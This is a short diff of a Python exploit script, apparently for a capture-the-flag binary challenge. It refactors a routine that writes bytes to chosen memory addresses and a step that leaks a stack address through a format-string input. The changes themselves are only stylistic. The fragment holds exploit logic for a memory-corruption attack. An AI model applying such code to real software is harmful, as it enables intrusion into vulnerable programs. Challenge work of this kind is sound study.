@@ -50,16 +50,14 @@ def make_byte(bt):
     global fuck
     global save
     global zero
-    i=0
-    for k in range(len(bt)):
+    for i, _ in enumerate(range(len(bt))):
         byte=u8(bt[i])
         set_addr(fuck+byte,stack_addr)
         sw()
         set_addr(fuck+byte+1,zero)
-        sw() 
+        sw()
         set_addr(fuck+byte,save+i)
-        sw() 
-        i+=1
+        sw()
         zero+=8
 
 if __name__ == '__main__':
@@ -74,7 +72,7 @@ if __name__ == '__main__':
     sw()
     sa("choice:",'%x')
     rv(8)
-    stack_addr=int('7fff'+rv(8),16)-6+0x30
+    stack_addr = int(f'7fff{rv(8)}', 16) - 6 + 0x30
     lg('stack_addr',stack_addr)
     sa("choice:",'a\x00')
     sla("address:",str(atoi))
